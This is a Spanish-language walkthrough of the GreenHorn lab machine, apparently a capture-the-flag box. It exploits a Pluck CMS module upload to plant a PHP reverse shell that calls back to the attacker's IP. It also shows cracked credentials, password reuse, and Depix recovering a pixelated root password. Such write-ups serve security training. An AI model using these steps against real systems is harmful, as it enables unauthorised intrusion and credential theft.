
# GreenHorn

<figure><img src="/files/tC06ptEmf3G5Kx2qQExj" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.249` a nuestro `/etc/hosts` y accedemos través del navegador.

<figure><img src="/files/s4f7om2MohZDmq7wO5FK" alt=""><figcaption></figcaption></figure>

Hacemos click en admin y nos lleva a una página para introducir una contraseña, y nos da la versión, con lo que podemos buscar un exploit público:

<figure><img src="/files/4ty81CAyCI1nVjLNbHBp" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.25
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
```

Encontramos 3 puertos abiertos

## <mark style="color:purple;">Búsqueda de exploits</mark>

Vamos a buscar exploit para la versión `pluck 4.7.18`. Encontramos este exploit:

{% embed url="<https://www.exploit-db.com/exploits/51592>" %}

¿Qué quiere decir esto?

Un atacante con una cuenta puede cargar un módulo falso en el sistema y ejecutar su contenido en el servidor. Esta es una vulnerabilidad crítica porque los desarrolladores no implementaron controles estrictos en los archivos cargados ni restringieron la ejecución de archivos en el servidor.

Si venimos al puerto 3000 que esta abierto en la máquina llegamos a esta página, que es una especie de GitHub propio de esta empresa:

<figure><img src="/files/vNWQaSFvOhGW2uEA5Z5I" alt=""><figcaption></figcaption></figure>

Y en la parte de Explore encontramos un repo:

<figure><img src="/files/tTpQWjPzMctQBMy12gqW" alt=""><figcaption></figcaption></figure>

Navegando un poco encontramos unas credenciales:

<figure><img src="/files/5qUvJyYOeRlvcth087da" alt=""><figcaption></figcaption></figure>

{% code title="pass.php" %}

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

{% endcode %}

{% code title="" %}

```php
<?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
```

{% endcode %}

Copiamos el valor del pass.php y lo crackeamos por ejemplo con crackstation:

{% embed url="<https://crackstation.net/>" %}

<figure><img src="/files/xHInnG5hkEs7YeCXKbG5" alt=""><figcaption></figcaption></figure>

Buuum! Ya tenemos una contraseña! Vamos a probarla con el login que nos encontramos antes:

<figure><img src="/files/FwtGZLv7oY1PYAwaoC6r" alt=""><figcaption></figcaption></figure>

Conseguimos acceder sin problema.&#x20;

## <mark style="color:purple;">Explotación</mark>

Si le damos a `check writable options` nos devuelve todos los archivos y rutas en las que tenemos permisos de escritura:

<figure><img src="/files/qv2YwHk7Ww3VwNVT2wcg" alt=""><figcaption></figcaption></figure>

Encontramos algún archivo interesante como `/data/settings/langpref.php` que podríamos intentar manipular para obtener una reverse shell.

<figure><img src="/files/JnTSZRVor3ElRQeCExTb" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/IciSNxpLEOoGRIlqFWd3" alt=""><figcaption></figcaption></figure>

En `Modules > Install a module` nos encontramos que podemos instalar un módulo, con lo que podemos intentar subir una webshell en PHP.

En Kali Linux por defecto tenemos una carpeta con webshells en la siguiente ruta:

```bash
cd /usr/share/webshells                     

ls             
asp  aspx  cfm  jsp  laudanum  perl  php

cd php

ls
findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
```

{% embed url="<https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php?source=post_page-----e87e1cc07864-------------------------------->" %}

Vamos a usar el `php-reverse-shell.php`, y lo tenemos que editar con nuestra IP de atacante y el puerto por el que vamos a quedarnos a la escucha:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.70';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Para poder cargar módulos nuevos en este site necesitamos comprimir la shell en un archivo zip. Podemos hacerlo de la siguiente manera:

```bash
sudo zip payload.zip php-reverse-shell.php
```

<figure><img src="/files/l8QXrtqDTKyahQGA1bXE" alt=""><figcaption></figcaption></figure>

Entonces abrimos un listener con netcat por el puerto `1234` y subimos el zip con la shell:

<figure><img src="/files/3AjLmVNX1fcvEjS7ZRXU" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/HJJdrvjy6yaH2EdCmCOl" alt=""><figcaption></figcaption></figure>

Vemos que se ha instalado correctamente y para recibir la conexión en nuestra terminal tenemos que acceder al archivo php. Tenemos que localizar la ruta donde se sube. Podríamos saberlo con BurpSuite al capturar la petición de subida, o haciendo un poco de research. Concretamente en esta máquina se sube a la siguiente ruta:

```
http://greenhorn.htb/data/modules/payload/php-reverse-shell.php
```

<figure><img src="/files/G7KwGznBuHbKStwRY1VI" alt=""><figcaption></figcaption></figure>

Buum! Recibimos la conexión en nuestra terminal.

<figure><img src="/files/4nwaFRCtoGERCk13pGX1" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">User flag</mark>

Como vemos somos el usuario www-data y solo hay 2 usuarios en el sistema:

* `git`
* `junior`

Si intentamos acceder al directorio junior, podemos acceder pero no nos deja leer el user.txt. Lo primero vamos a hacer un tratamiento de la tty para movernos un poco mejor:

```bash
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Como ya tenemos un password, vamos a intentar lo más sencillo: cambiar al usuario `junior` con la contraseña `iloveyou1`:

<figure><img src="/files/fX4m8PPGmh6osGd8GGFe" alt=""><figcaption></figcaption></figure>

Ya tenemos el user flag! 🏆

## <mark style="color:purple;">Escalada de privilegios</mark>

Hay un archivo pdf sospechoso en el directorio de junior, pero no podemos leerlo directamente, por lo que nos lo vamos a enviar a nuestro Kali Linux abriendo un servidor con python:

<figure><img src="/files/DytKbVZS2LLTlDdATysn" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/CeFRliViPxgNyhxre2oF" alt=""><figcaption></figcaption></figure>

Al abrir este PDF encontramos una contraseña... pero está pixelada!

<figure><img src="/files/mJFpXamy42h03kZ5UMa9" alt=""><figcaption></figcaption></figure>

¿Sabes qué significa esto? ¡Hoy vamos a aprender otra herramienta! Vamos a despixelar este password y obtener acceso root.

Vamos a utilizar una herramienta super popular para despixalizar contraseñas: `Depix`:

{% embed url="<https://github.com/spipm/Depix>" %}

Si arrastramos la imagen pixelada al explorador de archivos se nos guarda la imagen separada del documento, que es lo que necesitamos para pasárselo a la herramienta:

<figure><img src="/files/0sp0hzAw9H9xa799h5aK" alt=""><figcaption></figcaption></figure>

También podríamos usar alguna herramienta online para extraer imágenes de PDFs como esta:

{% embed url="<https://tools.pdf24.org/en/extract-images>" %}

Ahora nos clonamos el repo y lo tenemos que ejecutar de la siguiente manera:

```bash
python3 depix.py \
    -p ../image.7R3CS2.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /home/kali/Descargas/root_output.png
    
2024-08-08 11:54:14,049 - Loading pixelated image from ../image.7R3CS2.png
2024-08-08 11:54:14,093 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-08-08 11:54:15,193 - Finding color rectangles from pixelated space
2024-08-08 11:54:15,194 - Found 252 same color rectangles
2024-08-08 11:54:15,194 - 190 rectangles left after moot filter
2024-08-08 11:54:15,194 - Found 1 different rectangle sizes
2024-08-08 11:54:15,194 - Finding matches in search image
2024-08-08 11:54:15,194 - Scanning 190 blocks with size (5, 5)
2024-08-08 11:54:15,215 - Scanning in searchImage: 0/1674
2024-08-08 11:54:47,807 - Removing blocks with no matches
2024-08-08 11:54:47,808 - Splitting single matches and multiple matches
2024-08-08 11:54:47,812 - [16 straight matches | 174 multiple matches]
2024-08-08 11:54:47,812 - Trying geometrical matches on single-match squares
2024-08-08 11:54:48,045 - [29 straight matches | 161 multiple matches]
2024-08-08 11:54:48,046 - Trying another pass on geometrical matches
2024-08-08 11:54:48,246 - [41 straight matches | 149 multiple matches]
2024-08-08 11:54:48,246 - Writing single match results to output
2024-08-08 11:54:48,246 - Writing average results for multiple matches to output
2024-08-08 11:54:50,140 - Saving output image to: /home/kali/Descargas/root_output.png
```

Ahora si nos abrimos la imagen que nos ha generado vemos que lo ha despixelizado bastante bien y podemos ver la contraseña bastante clara:

<figure><img src="/files/kvda13ZLRCFWj6HmrBcG" alt=""><figcaption></figcaption></figure>

```
sidefromsidetheothersidesidefromsidetheotherside
```

Vamos a probarlo cambiando al usuario root y introduciendo esta contraseña:

<figure><img src="/files/MXzllFVUM324le9Vh3dm" alt=""><figcaption></figcaption></figure>

Ha funcionado y obtenemos la root flag! 🏆

{% hint style="warning" %}
Y no uséis el programa para despixelar las flags, cabrones ;)
{% endhint %}
